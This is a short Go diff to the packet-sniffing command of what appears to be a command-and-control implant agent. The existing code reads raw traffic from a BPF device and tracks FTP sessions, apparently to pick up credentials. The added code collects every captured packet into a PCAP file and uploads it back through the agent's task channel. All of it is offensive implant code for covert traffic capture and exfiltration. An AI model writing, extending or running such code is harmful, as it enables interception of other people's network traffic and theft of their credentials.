@@ -109,6 +109,10 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 	unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x8010426D), uintptr(unsafe.Pointer(&tv)))
 
 	ftpTracker := &sniffFTPTracker{pending: make(map[string]string)}
+	var pcapCollector *sniffPCAPCollector
+	if params.SavePCAP {
+		pcapCollector = newSniffPCAPCollector(params.MaxBytes)
+	}
 	deadline := time.Now().Add(time.Duration(params.Duration) * time.Second)
 	startTime := time.Now()
 	buf := make([]byte, bufLen)
@@ -146,6 +150,10 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 			packet := buf[pktStart:pktEnd]
 			result.PacketCount++
 			result.BytesCaptured += int64(capLen)
+
+			if pcapCollector != nil {
+				pcapCollector.addPacket(packet)
+			}
 
 			// Parse Ethernet -> IPv4 -> TCP
 			if len(packet) >= 14 {
@@ -210,6 +218,12 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	result.Duration = time.Since(startTime).Truncate(time.Second).String()
+
+	if pcapCollector != nil && len(pcapCollector.packets) > 0 {
+		pcapData := pcapCollector.buildPCAP(1) // LINKTYPE_ETHERNET
+		sniffUploadPCAP(&task, pcapData, result)
+	}
+
 	output, _ := json.Marshal(result)
 	return successResult(string(output))
 }
